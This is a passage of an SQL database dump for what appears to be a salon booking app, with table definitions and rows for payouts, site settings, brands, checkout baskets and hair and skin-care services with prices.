(8, 20, 'D&DPAY1000000007', '1000000007', 'Cash', 'credit', 1000, '2021-12-25', '12', '2021', '05:43:30 AM'),
(9, 27, 'D&DPAY1000000008', '1000000008', 'Cash', 'credit', 1000, '2021-12-25', '12', '2021', '10:24:38 AM'),
(10, 27, 'D&DPAY1000000009', '1000000009', 'Cash', 'debit', 1000, '2021-12-25', '12', '2021', '10:29:54 AM'),
(11, 25, 'D&DPAY1000000010', '1000000010', 'Cash', 'credit', 1000, '2021-12-25', '12', '2021', '10:30:25 AM'),
(12, 12, 'D&DPAY1000000011', '1000000011', 'Cash', 'credit', 1500, '2021-12-28', '12', '2021', '06:13:09 AM'),
(13, 36, 'D&DPAY1000000012', '1000000012', 'Cash', 'credit', 1000, '2022-01-07', '01', '2022', '07:33:39 AM');

-- --------------------------------------------------------

--
-- Table structure for table `payout_setting`
--

CREATE TABLE `payout_setting` (
  `id` int(11) NOT NULL,
  `pid` int(11) NOT NULL,
  `amt` double NOT NULL,
  `trans_id` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `date` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  `bname` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `ifsc` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `pname` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `acno` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `upi` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `payout_setting`
--

INSERT INTO `payout_setting` (`id`, `pid`, `amt`, `trans_id`, `date`, `bname`, `ifsc`, `pname`, `acno`, `upi`, `status`) VALUES
(7, 2, 200, 'PAY98755624801', '2021-12-08 09:43:10', 'SBI', 'SBI000178', 'Arijit Das', '1234567890562', NULL, 1),
(10, 2, 100, 'PAY0123456789', '2021-12-08 08:20:02', NULL, NULL, NULL, NULL, 'arijit76@sbi.com', 1);

-- --------------------------------------------------------

--
-- Table structure for table `setting`
--

CREATE TABLE `setting` (
  `id` int(11) NOT NULL,
  `logo` mediumtext NOT NULL,
  `d_title` mediumtext NOT NULL,
  `d_s_title` mediumtext NOT NULL,
  `one_key` mediumtext NOT NULL,
  `one_hash` mediumtext NOT NULL,
  `r_key` text NOT NULL,
  `r_hash` text NOT NULL,
  `currency` text NOT NULL,
  `timezone` text NOT NULL,
  `policy` text NOT NULL,
  `about` text NOT NULL,
  `contact` text NOT NULL,
  `terms` text NOT NULL,
  `signupcredit` int(11) NOT NULL,
  `refercredit` int(11) NOT NULL,
  `mlimit` int(11) NOT NULL,
  `asid` text NOT NULL,
  `token` text NOT NULL,
  `megic_Num` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `setting`
--

INSERT INTO `setting` (`id`, `logo`, `d_title`, `d_s_title`, `one_key`, `one_hash`, `r_key`, `r_hash`, `currency`, `timezone`, `policy`, `about`, `contact`, `terms`, `signupcredit`, `refercredit`, `mlimit`, `asid`, `token`, `megic_Num`) VALUES
(1, 'xxxxx', 'xxxxx', 'xxxxx', 'xxxxx', 'xxxxx', 'xxxxx', 'xxxxx', '$', 'Asia/Kolkata', 'xxxxx', 'xxxxx', 'xxxxx', 'xxxxx', 0, 0, 0, 'xxxxx', 'xxxxx', 'xxxxx');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_addon`
--

CREATE TABLE `tbl_addon` (
  `id` int(11) NOT NULL,
  `cid` int(11) NOT NULL,
  `title` text CHARACTER SET utf8 NOT NULL,
  `price` float NOT NULL,
  `img` text NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_addon`
--

INSERT INTO `tbl_addon` (`id`, `cid`, `title`, `price`, `img`, `status`) VALUES
(1, 1, 'Healthy Scalp Treatment', 200, 'http://admin.dudeanddamsels.com/assets/images/img/1636583657logo.png', 1),
(3, 1, 'Deep Tissue Massage Therapy', 400, 'http://admin.dudeanddamsels.com/assets/images/img/1636583935women_massage.jpeg', 1),
(4, 4, 'Prenatal Massage', 500, 'http://admin.dudeanddamsels.com/assets/images/img/1636583851men_massage.jpg', 1),
(7, 1, 'Special hair cut for Women', 300, 'http://admin.dudeanddamsels.com/assets/images/img/1636584049women_sallon.jpg', 0);

-- --------------------------------------------------------

--
-- Table structure for table `tbl_address`
--

CREATE TABLE `tbl_address` (
  `id` int(11) NOT NULL,
  `uid` int(11) NOT NULL,
  `address` text NOT NULL,
  `pincode` int(11) NOT NULL,
  `houseno` text NOT NULL,
  `landmark` text NOT NULL,
  `type` text NOT NULL,
  `lat_map` text NOT NULL,
  `long_map` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `tbl_brand`
--

CREATE TABLE `tbl_brand` (
  `id` int(11) NOT NULL,
  `brand` varchar(225) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `img` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `tbl_brand`
--

INSERT INTO `tbl_brand` (`id`, `brand`, `img`, `status`) VALUES
(7, 'CHERYL\'S', 'http://admin.dudeanddamsels.com/assets/images/img/1638345094CHERYLS.jpg', 1),
(8, 'O3+', 'http://admin.dudeanddamsels.com/assets/images/img/1638345183O3+.png', 1),
(9, 'JANSSEN', 'http://admin.dudeanddamsels.com/assets/images/img/1638345294JANSSEN.jpg', 1),
(10, 'CASMARA', 'http://admin.dudeanddamsels.com/assets/images/img/1638345528CASMARA.png', 1),
(11, 'SCHWARZKOPF', 'http://admin.dudeanddamsels.com/assets/images/img/1638345697SCHWARZKOPF_PIC.png', 1),
(13, 'RICA', 'http://admin.dudeanddamsels.com/assets/images/img/1638345819RICA.png', 1),
(14, 'WAXXO', 'http://admin.dudeanddamsels.com/assets/images/img/1638432199WAXXO_(2).jpeg', 1),
(15, 'Brazilian Wax', 'http://admin.dudeanddamsels.com/assets/images/img/1638432355BRAZILIN_WAXX.png', 1),
(16, 'Makeup Studio', 'http://admin.dudeanddamsels.com/assets/images/img/1638432440makeup_studio.jpg', 1),
(17, 'Kryolan', 'http://admin.dudeanddamsels.com/assets/images/img/1638432516kryolan.jpg', 1),
(18, 'PAC', 'http://admin.dudeanddamsels.com/assets/images/img/1638432596PAC.png', 1),
(19, 'MAC', 'http://admin.dudeanddamsels.com/assets/images/img/1638432645MAC.png', 1);

-- --------------------------------------------------------

--
-- Table structure for table `tbl_cash`
--

CREATE TABLE `tbl_cash` (
  `id` int(11) NOT NULL,
  `rid` int(11) NOT NULL,
  `amt` int(11) NOT NULL,
  `message` text CHARACTER SET utf8 NOT NULL,
  `pdate` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `tbl_checkout`
--

CREATE TABLE `tbl_checkout` (
  `id` int(11) NOT NULL,
  `uid` int(11) DEFAULT NULL,
  `total_price` double DEFAULT NULL,
  `itemdetails` longtext COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `tbl_checkout`
--

INSERT INTO `tbl_checkout` (`id`, `uid`, `total_price`, `itemdetails`) VALUES
(3, 23, 759.2, '[{\"id\":\"30\",\"cid\":\"14\",\"sid\":\"29\",\"title\":\"Schwarzkopf - Shoulder\",\"price\":\"949\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638793371straightened-hair.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(5, 23, 1718.4, '[{\"id\":\"30\",\"cid\":\"14\",\"sid\":\"29\",\"title\":\"Schwarzkopf - Shoulder\",\"price\":\"949\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638793371straightened-hair.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1},{\"id\":\"32\",\"cid\":\"14\",\"sid\":\"29\",\"title\":\"Schwarzkopf - Full \",\"price\":\"1199\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638794382hair-spa-FULL.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(6, 14, 840, '[{\"id\":\"15\",\"cid\":\"10\",\"sid\":\"24\",\"title\":\"CHERYL\'S GLOWVIT FACIAL \",\"price\":\"1050\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638784274cheryls-1.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(7, 23, 1718.4, '[{\"id\":\"30\",\"cid\":\"14\",\"sid\":\"29\",\"title\":\"Schwarzkopf - Shoulder\",\"price\":\"949\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638793371straightened-hair.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1},{\"id\":\"32\",\"cid\":\"14\",\"sid\":\"29\",\"title\":\"Schwarzkopf - Full \",\"price\":\"1199\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638794382hair-spa-FULL.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(9, 23, 1718.4, '[{\"id\":\"30\",\"cid\":\"14\",\"sid\":\"29\",\"title\":\"Schwarzkopf - Shoulder\",\"price\":\"949\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638793371straightened-hair.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1},{\"id\":\"32\",\"cid\":\"14\",\"sid\":\"29\",\"title\":\"Schwarzkopf - Full \",\"price\":\"1199\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638794382hair-spa-FULL.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(15, 14, 2600, '[{\"id\":\"45\",\"cid\":\"14\",\"sid\":\"28\",\"title\":\"Global ( Schwarzkopf, Absolute Brown)- Mid Length\",\"price\":\"3250\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638787918MID.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(16, 14, 3119.2, '[{\"id\":\"43\",\"cid\":\"14\",\"sid\":\"28\",\"title\":\"Touchup- Schwarzkopf Absolute Brown\",\"price\":\"899\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638786557swc.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1},{\"id\":\"44\",\"cid\":\"14\",\"sid\":\"28\",\"title\":\"Global ( Schwarzkopf, Absolute Brown)- Short Length\",\"price\":\"3000\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638787350GLOBAL-HALF.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(17, 14, 2400, '[{\"id\":\"44\",\"cid\":\"14\",\"sid\":\"28\",\"title\":\"Global ( Schwarzkopf, Absolute Brown)- Short Length\",\"price\":\"3000\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638787350GLOBAL-HALF.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(18, 14, 2400, '[{\"id\":\"44\",\"cid\":\"14\",\"sid\":\"28\",\"title\":\"Global ( Schwarzkopf, Absolute Brown)- Short Length\",\"price\":\"3000\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638787350GLOBAL-HALF.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(19, 14, 840, '[{\"id\":\"15\",\"cid\":\"10\",\"sid\":\"24\",\"title\":\"CHERYL\'S GLOWVIT FACIAL \",\"price\":\"1050\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638784274cheryls-1.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(20, 23, 12000, '[{\"id\":\"79\",\"cid\":\"22\",\"sid\":\"39\",\"title\":\"Bridal Make-Up\",\"price\":\"15000\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638862920bridal.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(21, 23, 1718.4, '[{\"id\":\"30\",\"cid\":\"14\",\"sid\":\"29\",\"title\":\"Schwarzkopf - Shoulder\",\"price\":\"949\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638793371straightened-hair.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1},{\"id\":\"32\",\"cid\":\"14\",\"sid\":\"29\",\"title\":\"Schwarzkopf - Full \",\"price\":\"1199\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638794382hair-spa-FULL.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(22, 23, 1718.4, '[{\"id\":\"30\",\"cid\":\"14\",\"sid\":\"29\",\"title\":\"Schwarzkopf - Shoulder\",\"price\":\"949\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638793371straightened-hair.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1},{\"id\":\"32\",\"cid\":\"14\",\"sid\":\"29\",\"title\":\"Schwarzkopf - Full \",\"price\":\"1199\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638794382hair-spa-FULL.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(23, 23, 1718.4, '[{\"id\":\"30\",\"cid\":\"14\",\"sid\":\"29\",\"title\":\"Schwarzkopf - Shoulder\",\"price\":\"949\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638793371straightened-hair.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1},{\"id\":\"32\",\"cid\":\"14\",\"sid\":\"29\",\"title\":\"Schwarzkopf - Full \",\"price\":\"1199\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638794382hair-spa-FULL.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(24, 23, 1718.4, '[{\"id\":\"30\",\"cid\":\"14\",\"sid\":\"29\",\"title\":\"Schwarzkopf - Shoulder\",\"price\":\"949\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638793371straightened-hair.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1},{\"id\":\"32\",\"cid\":\"14\",\"sid\":\"29\",\"title\":\"Schwarzkopf - Full \",\"price\":\"1199\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638794382hair-spa-FULL.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(25, 14, 840, '[{\"id\":\"15\",\"cid\":\"10\",\"sid\":\"24\",\"title\":\"CHERYL\'S GLOWVIT FACIAL \",\"price\":\"1050\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638784274cheryls-1.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(26, 25, 798.4, '[{\"id\":\"33\",\"cid\":\"14\",\"sid\":\"27\",\"title\":\"Normal Hair Cut\",\"price\":\"499\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638784784haircut.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":2}]'),
(27, 25, 798.4, '[{\"id\":\"33\",\"cid\":\"14\",\"sid\":\"27\",\"title\":\"Normal Hair Cut\",\"price\":\"499\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638784784haircut.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":2}]'),
(28, 25, 798.4, '[{\"id\":\"33\",\"cid\":\"14\",\"sid\":\"27\",\"title\":\"Normal Hair Cut\",\"price\":\"499\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638784784haircut.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":2}]'),
(29, 26, 719.2, '[{\"id\":\"43\",\"cid\":\"14\",\"sid\":\"28\",\"title\":\"Touchup- Schwarzkopf Absolute Brown\",\"price\":\"899\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638786557swc.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(30, 26, 2400, '[{\"id\":\"44\",\"cid\":\"14\",\"sid\":\"28\",\"title\":\"Global ( Schwarzkopf, Absolute Brown)- Short Length\",\"price\":\"3000\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638787350GLOBAL-HALF.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(31, 14, 840, '[{\"id\":\"15\",\"cid\":\"10\",\"sid\":\"24\",\"title\":\"CHERYL\'S GLOWVIT FACIAL \",\"price\":\"1050\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638784274cheryls-1.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(32, 25, 798.4, '[{\"id\":\"33\",\"cid\":\"14\",\"sid\":\"27\",\"title\":\"Normal Hair Cut\",\"price\":\"499\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638784784haircut.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":2}]'),
(33, 25, 1197.6, '[{\"id\":\"33\",\"cid\":\"14\",\"sid\":\"27\",\"title\":\"Normal Hair Cut\",\"price\":\"499\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638784784haircut.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":3}]'),
(34, 25, 1197.6, '[{\"id\":\"33\",\"cid\":\"14\",\"sid\":\"27\",\"title\":\"Normal Hair Cut\",\"price\":\"499\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638784784haircut.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":3}]'),
(35, 25, 1280, '[{\"id\":\"78\",\"cid\":\"21\",\"sid\":\"38\",\"title\":\"Full Body - Rica \\/ Roll On\",\"price\":\"1600\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638816783RICA-FULL-BODY.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(36, 25, 1280, '[{\"id\":\"78\",\"cid\":\"21\",\"sid\":\"38\",\"title\":\"Full Body - Rica \\/ Roll On\",\"price\":\"1600\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638816783RICA-FULL-BODY.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(37, 25, 1197.6, '[{\"id\":\"33\",\"cid\":\"14\",\"sid\":\"27\",\"title\":\"Normal Hair Cut\",\"price\":\"499\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638784784haircut.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":3}]'),
(38, 42, 33592, '[{\"id\":\"16\",\"cid\":\"10\",\"sid\":\"24\",\"title\":\"O3+ POWER BRIGHTENING FACIAL\",\"price\":\"2000\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638779726o3.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":3},{\"id\":\"17\",\"cid\":\"10\",\"sid\":\"24\",\"title\":\"JANSSEN SKIN FIRMING & WHITENING FACIAL\",\"price\":\"2999\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638780569janseen.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":4},{\"id\":\"18\",\"cid\":\"10\",\"sid\":\"24\",\"title\":\"CASMARA- GOJI ANTI -OXIDANT FACIAL\",\"price\":\"3999\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638783199casmara.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":6}]'),
(39, 42, 759.2, '[{\"id\":\"30\",\"cid\":\"14\",\"sid\":\"29\",\"title\":\"Schwarzkopf - Shoulder\",\"price\":\"949\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638793371straightened-hair.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(40, 42, 719.2, '[{\"id\":\"82\",\"cid\":\"23\",\"sid\":\"41\",\"title\":\"Clean Up - Casmara\",\"price\":\"899\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1640863271casmara.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(41, 42, 1600, '[{\"id\":\"16\",\"cid\":\"10\",\"sid\":\"24\",\"title\":\"O3+ POWER BRIGHTENING FACIAL\",\"price\":\"2000\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638779726o3.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(42, 42, 1600, '[{\"id\":\"16\",\"cid\":\"10\",\"sid\":\"24\",\"title\":\"O3+ POWER BRIGHTENING FACIAL\",\"price\":\"2000\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638779726o3.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(43, 56, 399.2, '[{\"id\":\"33\",\"cid\":\"14\",\"sid\":\"27\",\"title\":\"Normal Hair Cut\",\"price\":\"499\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638784784haircut.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]'),
(44, 56, 200, '[{\"id\":\"34\",\"cid\":\"14\",\"sid\":\"27\",\"title\":\"Hair Cut- Fringes \",\"price\":\"250\",\"img\":\"http:\\/\\/admin.dudeanddamsels.com\\/assets\\/images\\/img\\/1638785247FINGERS.jpg\",\"status\":\"1\",\"is_child\":\"0\",\"count\":1}]');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_child`
--

CREATE TABLE `tbl_child` (
  `id` int(11) NOT NULL,
  `cid` int(11) NOT NULL,
  `sid` int(11) NOT NULL DEFAULT 0,
  `title` text CHARACTER SET utf8 NOT NULL,
  `description` text NOT NULL,
  `price` text NOT NULL,
  `img` text NOT NULL,
  `status` int(11) NOT NULL,
  `is_child` int(11) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_child`
--

INSERT INTO `tbl_child` (`id`, `cid`, `sid`, `title`, `description`, `price`, `img`, `status`, `is_child`) VALUES
(1, 1, 1, 'Facial', 'facial for women', '200', 'http://admin.dudeanddamsels.com/assets/images/img/1636580688lusso_bella.jpeg', 0, 0),
(2, 1, 1, 'Makeup', 'nude makeup', '400', 'http://admin.dudeanddamsels.com/assets/images/img/1636580700lusso_bella.jpeg', 0, 0),
(6, 5, 9, 'Premium', 'premium desc', '0', 'http://admin.dudeanddamsels.com/assets/images/img/1637340546keratine-treatment.jpeg', 0, 3),
(7, 5, 9, 'Standard', 'standard desc', '0', 'http://admin.dudeanddamsels.com/assets/images/img/163734050388d67ebd59f76a89c8d95b5da38bd0e108-15-straight-hair_rsquare_w700.jpg', 1, 3),
(8, 5, 20, 'Normal Hair cut', 'normal hair cut', '499', 'http://admin.dudeanddamsels.com/assets/images/img/163733955420-hottest-short-hairstyles-short-haircuts-for-women-.jpeg', 1, 0),
(9, 5, 20, 'Temporay Ironing & Curling', 'temp ironing', '0', 'http://admin.dudeanddamsels.com/assets/images/img/16373396155a736def46a2884d0d8b4637.jpeg', 1, 3),
(10, 5, 19, 'Standard', 'standard description', '0', 'http://admin.dudeanddamsels.com/assets/images/img/16373369264-medium-length-straight-hair-with-layers-CKjceXbMRWr.jpeg', 1, 3),
(11, 5, 19, 'Premium', 'premium description', '0', 'http://admin.dudeanddamsels.com/assets/images/img/1637336988medium-length-hairstyles-1.jpeg', 1, 6),
(15, 10, 24, 'CHERYL\'S GLOWVIT FACIAL ', 'Instant skin lightening facial for a radiant and glowing skin.', '1050', 'http://admin.dudeanddamsels.com/assets/images/img/1638784274cheryls-1.jpg', 1, 0),
(16, 10, 24, 'O3+ POWER BRIGHTENING FACIAL', 'Controls and prevents uneven skin tone and pigmentation, brightening and energizing the skin, reduces the appearance of fine lines and wrinkles.', '2000', 'http://admin.dudeanddamsels.com/assets/images/img/1638779726o3.jpg', 1, 0),
(17, 10, 24, 'JANSSEN SKIN FIRMING & WHITENING FACIAL', 'A luxurious and relaxing anti-aging treatment that fully moisturizes, smoothens fine lines and contours aging skin.  ', '2999', 'http://admin.dudeanddamsels.com/assets/images/img/1638780569janseen.jpg', 1, 0),
(18, 10, 24, 'CASMARA- GOJI ANTI -OXIDANT FACIAL', 'A stimulating anti oxidant facial containing extracts of Goji berries and Quinoa seeds for a younger looking skin.', '3999', 'http://admin.dudeanddamsels.com/assets/images/img/1638783199casmara.jpg', 1, 0),
(27, 5, 25, 'TOUCH UP - Schwarzkopf Absolute Brown', 'Touching up the roots of the hair for a grey coverage.', '899', 'http://admin.dudeanddamsels.com/assets/images/img/1638344129Untitled-21.png', 1, 0),
(28, 5, 25, 'TOUCH UP - Schwarzkopf Essensity', 'Touching up the roots of the hair for a grey coverage.', '999', 'http://admin.dudeanddamsels.com/assets/images/img/1638344360DD_Black_1024.png', 0, 0),
(29, 5, 17, 'Schwarzkopf Glatt- Shoulder', 'Rebonding upto shoulder length.', '4750', 'http://admin.dudeanddamsels.com/assets/images/img/1638347210rebonding.jpg', 1, 0),
(30, 14, 29, 'Schwarzkopf - Shoulder', 'Removes all dirt, pollutants and contaminants from the pores.', '949', 'http://admin.dudeanddamsels.com/assets/images/img/1638793371straightened-hair.jpg', 1, 0),
(31, 14, 29, 'Schwarzkopf -  Mid Back Lenght', 'Removes all dirt, pollutants and contaminants from the pores.', '999', 'http://admin.dudeanddamsels.com/assets/images/img/1638793867hair-spa-mid.jpg', 1, 0),
(32, 14, 29, 'Schwarzkopf - Full ', 'Removes all dirt, pollutants and contaminants from the pores.', '1199', 'http://admin.dudeanddamsels.com/assets/images/img/1638794382hair-spa-FULL.jpg', 1, 0),
(33, 14, 27, 'Normal Hair Cut', 'A regular haircut, in Western fashion, is a men\'s and boys\' hairstyle that has hair long enough to comb on top, a defined or deconstructed side part, and a short, semi-short, medium, long, or extra long back and sides.', '499', 'http://admin.dudeanddamsels.com/assets/images/img/1638784784haircut.jpg', 1, 0),
(34, 14, 27, 'Hair Cut- Fringes ', 'A regular haircut, in Western fashion, is a men\'s and boys\' hairstyle that has hair long enough to comb on top, a defined or deconstructed side part, and a short, semi-short, medium, long, or extra long back and sides.', '250', 'http://admin.dudeanddamsels.com/assets/images/img/1638785247FINGERS.jpg', 1, 0),
(35, 14, 33, 'Ironing', ' Its ability to distribute heat equally.', '500', 'http://admin.dudeanddamsels.com/assets/images/img/1638802293IRON.jpg', 1, 0),
(36, 14, 33, 'Hair Curling', 'Identifying your curl shape and pattern (or patterns) is best determined while your hair is sopping wet', '500', 'http://admin.dudeanddamsels.com/assets/images/img/1638802933CURLING.jpg', 1, 0),
(37, 14, 30, 'Keratin- Upto Neck', ' Keratin is a protective protein, less prone to scratching or tearing than other types of cells your body produces. Keratin can be derived from the feathers, horns, and wool of different animals and used as an ingredient in hair cosmetics.', '3299', 'http://admin.dudeanddamsels.com/assets/images/img/1638794815keratin-NECK.jpg', 1, 0),
(38, 14, 30, 'Keratin- Upto Shoulder', ' Keratin is a protective protein, less prone to scratching or tearing than other types of cells your body produces. Keratin can be derived from the feathers, horns, and wool of different animals and used as an ingredient in hair cosmetics.', '3599', 'http://admin.dudeanddamsels.com/assets/images/img/1638795750keratin-sol.jpg', 1, 0),
(39, 14, 30, 'Keratin-  Long', ' Keratin is a protective protein, less prone to scratching or tearing than other types of cells your body produces. Keratin can be derived from the feathers, horns, and wool of different animals and used as an ingredient in hair cosmetics.', '3990', 'http://admin.dudeanddamsels.com/assets/images/img/1638797871keratin-long.jpg', 1, 0),
(42, 15, 35, 'Global ( Schwarzkopf, Absolute Brown)- Short Length', 'Total coverage of hair with the same colour from root to tip.', '3000', 'http://admin.dudeanddamsels.com/assets/images/img/1638358437D_D.jpeg', 0, 0),
(43, 14, 28, 'Touchup- Schwarzkopf Absolute Brown', 'Quick fix to cover the roots of grey hair.', '899', 'http://admin.dudeanddamsels.com/assets/images/img/1638786557swc.jpg', 1, 0),
(44, 14, 28, 'Global ( Schwarzkopf, Absolute Brown)- Short Length', 'A colouring technique covering the hair with the same colour from root to tip.', '3000', 'http://admin.dudeanddamsels.com/assets/images/img/1638787350GLOBAL-HALF.jpg', 1, 0),
